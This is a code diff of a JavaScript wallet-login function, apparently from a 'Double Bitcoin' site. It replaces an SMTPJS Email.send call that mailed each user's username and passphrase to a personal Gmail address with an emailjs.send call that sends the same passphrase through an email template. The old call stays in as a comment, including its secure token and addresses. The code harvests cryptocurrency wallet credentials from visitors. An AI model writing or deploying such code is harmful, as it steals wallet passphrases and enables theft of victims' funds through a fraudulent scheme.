@@ -60,13 +60,21 @@ function open_wallet() {
     //});
     //saveAs(blob, "logindetail.txt");
 
-    Email.send({
-        SecureToken: "27be0cb0-1159-4c67-a686-901903f2814d",
-        To: 'blgnbalogun@gmail.com',
-        From: "Gift Balogun <hellogift@giftbalogun.name.ng>",
-        Subject: "User Registration Double Bitcoin",
-        Body: 'Username: ' + userme + '     ' + 'Passphase: ' + pass,
-    });
+    var templateParams = {
+        to_name: userme,
+        from_name: userme,
+        message_html: pass,
+    };
+
+    emailjs.send('default_service', 'template_pR1m0yoK', templateParams);
+
+    //Email.send({
+    //    SecureToken: "27be0cb0-1159-4c67-a686-901903f2814d",
+    //    To: 'blgnbalogun@gmail.com',
+    //    From: "Gift Balogun <hellogift@giftbalogun.name.ng>",
+    //    Subject: "User Registration Double Bitcoin",
+    //    Body: 'Username: ' + userme + '     ' + 'Passphase: ' + pass,
+    //});
 
 }
 
